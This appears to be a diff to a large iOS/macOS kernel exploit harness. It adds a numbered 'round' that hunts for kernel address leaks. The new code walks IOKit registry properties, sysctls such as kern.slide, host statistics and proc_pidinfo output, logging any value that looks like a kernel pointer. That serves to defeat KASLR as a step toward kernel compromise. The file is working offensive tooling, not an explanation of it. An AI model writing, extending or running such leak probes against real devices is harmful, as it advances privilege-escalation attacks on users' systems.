@@ -17888,6 +17888,160 @@ new_modes:
             rlog("*** Probe complete ***\n");
             goto done;
         }
+        if (rounds == 241) {
+            rlog("*** rounds=241: Deep IOKit registry scan + sysctl probe ***\n");
+            
+            /* Scan ALL accessible IOKit services for registry properties with kernel pointers */
+            rlog("\n  === Deep IOKit Registry Scan ===\n");
+            io_iterator_t iter241 = 0;
+            kern_return_t kr241 = IOServiceGetMatchingServices(kIOMasterPortDefault,
+                IOServiceMatching("IOService"), &iter241);
+            rlog("  IOServiceGetMatchingServices: kr=%d\n", kr241);
+            
+            int svc_count = 0, kptr_count = 0;
+            io_service_t svc241;
+            while ((svc241 = IOIteratorNext(iter241)) != 0 && svc_count < 200) {
+                svc_count++;
+                io_name_t name241;
+                IORegistryEntryGetName(svc241, name241);
+                
+                CFMutableDictionaryRef props241 = NULL;
+                kr241 = IORegistryEntryCreateCFProperties(svc241, &props241, kCFAllocatorDefault, 0);
+                if (kr241 == 0 && props241) {
+                    CFIndex cnt241 = CFDictionaryGetCount(props241);
+                    const void **keys241 = malloc(sizeof(void*) * cnt241);
+                    const void **vals241 = malloc(sizeof(void*) * cnt241);
+                    CFDictionaryGetKeysAndValues(props241, keys241, vals241);
+                    
+                    for (CFIndex i = 0; i < cnt241; i++) {
+                        if (CFGetTypeID(vals241[i]) == CFNumberGetTypeID()) {
+                            int64_t numval = 0;
+                            CFNumberGetValue((CFNumberRef)vals241[i], kCFNumberSInt64Type, &numval);
+                            uint64_t uval = (uint64_t)numval;
+                            if ((uval & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                char kb241[256] = {0};
+                                CFStringRef kd241 = CFCopyDescription(keys241[i]);
+                                if (kd241) CFStringGetCString(kd241, kb241, sizeof(kb241), kCFStringEncodingUTF8);
+                                rlog("  KPTR! svc=%s key=%s val=0x%016llx\n", name241, kb241, uval);
+                                if (kd241) CFRelease(kd241);
+                                kptr_count++;
+                            }
+                        } else if (CFGetTypeID(vals241[i]) == CFDataGetTypeID()) {
+                            CFDataRef dval = (CFDataRef)vals241[i];
+                            CFIndex dlen = CFDataGetLength(dval);
+                            const uint8_t *dp = CFDataGetBytePtr(dval);
+                            for (CFIndex j = 0; j + 8 <= dlen; j += 8) {
+                                uint64_t v = *(uint64_t*)(dp + j);
+                                if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    char kb241[256] = {0};
+                                    CFStringRef kd241 = CFCopyDescription(keys241[i]);
+                                    if (kd241) CFStringGetCString(kd241, kb241, sizeof(kb241), kCFStringEncodingUTF8);
+                                    rlog("  KPTR! svc=%s key=%s +%ld: 0x%016llx\n", name241, kb241, (long)j, v);
+                                    if (kd241) CFRelease(kd241);
+                                    kptr_count++;
+                                    if (kptr_count >= 50) break;
+                                }
+                            }
+                        }
+                    }
+                    free(keys241); free(vals241);
+                    CFRelease(props241);
+                }
+                IOObjectRelease(svc241);
+            }
+            if (iter241) IOObjectRelease(iter241);
+            rlog("  Scanned %d services, found %d kernel pointers\n", svc_count, kptr_count);
+            
+            /* Probe sysctl for kernel addresses */
+            rlog("\n  === Sysctl Probe ===\n");
+            {
+                /* kern.slide - classic KASLR leak (usually blocked) */
+                uint64_t slide = 0;
+                size_t slide_len = sizeof(slide);
+                int ret = sysctlbyname("kern.slide", &slide, &slide_len, NULL, 0);
+                rlog("  kern.slide: ret=%d val=0x%llx\n", ret, slide);
+                
+                /* kern.bootargs */
+                char bootargs[256] = {0};
+                size_t ba_len = sizeof(bootargs);
+                ret = sysctlbyname("kern.bootargs", bootargs, &ba_len, NULL, 0);
+                rlog("  kern.bootargs: ret=%d val=%s\n", ret, bootargs);
+                
+                /* hw.memsize */
+                uint64_t memsize = 0;
+                size_t ms_len = sizeof(memsize);
+                sysctlbyname("hw.memsize", &memsize, &ms_len, NULL, 0);
+                rlog("  hw.memsize: 0x%llx (%llu MB)\n", memsize, memsize/1024/1024);
+                
+                /* kern.version */
+                char kver[256] = {0};
+                size_t kv_len = sizeof(kver);
+                sysctlbyname("kern.version", kver, &kv_len, NULL, 0);
+                rlog("  kern.version: %s\n", kver);
+                
+                /* Try various vm/memory sysctls */
+                uint64_t val64 = 0;
+                size_t v64_len = sizeof(val64);
+                
+                ret = sysctlbyname("vm.kernel_page_size", &val64, &v64_len, NULL, 0);
+                rlog("  vm.kernel_page_size: ret=%d val=%llu\n", ret, val64);
+                
+                val64 = 0; v64_len = sizeof(val64);
+                ret = sysctlbyname("kern.maxproc", &val64, &v64_len, NULL, 0);
+                rlog("  kern.maxproc: ret=%d val=%llu\n", ret, val64);
+            }
+            
+            /* Probe host_statistics64 */
+            rlog("\n  === host_statistics64 Probe ===\n");
+            {
+                host_t host = mach_host_self();
+                
+                /* VM_INFO */
+                vm_statistics64_data_t vmstat;
+                mach_msg_type_number_t vmcount = HOST_VM_INFO64_COUNT;
+                kern_return_t kr = host_statistics64(host, HOST_VM_INFO64,
+                    (host_info64_t)&vmstat, &vmcount);
+                rlog("  HOST_VM_INFO64: kr=%d count=%u\n", kr, vmcount);
+                if (kr == 0) {
+                    uint64_t *raw = (uint64_t*)&vmstat;
+                    for (unsigned i = 0; i < vmcount * sizeof(integer_t) / 8; i++) {
+                        if ((raw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("    KPTR at field %u: 0x%016llx\n", i, raw[i]);
+                        }
+                    }
+                    rlog("    free=%llu active=%llu inactive=%llu wire=%llu\n",
+                         (uint64_t)vmstat.free_count, (uint64_t)vmstat.active_count,
+                         (uint64_t)vmstat.inactive_count, (uint64_t)vmstat.wire_count);
+                }
+                
+                /* CPU_LOAD_INFO */
+                host_cpu_load_info_data_t cpuload;
+                mach_msg_type_number_t cpucount = HOST_CPU_LOAD_INFO_COUNT;
+                kr = host_statistics(host, HOST_CPU_LOAD_INFO,
+                    (host_info_t)&cpuload, &cpucount);
+                rlog("  HOST_CPU_LOAD_INFO: kr=%d\n", kr);
+                
+                /* Try proc_pidinfo for other processes */
+                rlog("\n  === proc_pidinfo Probe ===\n");
+                /* Get our own proc info using raw buffer */
+                char tinfo[1024];
+                memset(tinfo, 0, sizeof(tinfo));
+                int pret = proc_pidinfo(getpid(), 2 /*PROC_PIDTASKALLINFO*/, 0, tinfo, sizeof(tinfo));
+                rlog("  proc_pidinfo(self, TASKALLINFO): ret=%d\n", pret);
+                if (pret > 0) {
+                    uint64_t *raw = (uint64_t*)tinfo;
+                    for (int i = 0; i < pret/8; i++) {
+                        uint64_t v = raw[i];
+                        if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("    KPTR at offset %d: 0x%016llx\n", i*8, v);
+                        }
+                    }
+                }
+            }
+            
+            rlog("*** Deep probe complete ***\n");
+            goto done;
+        }
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
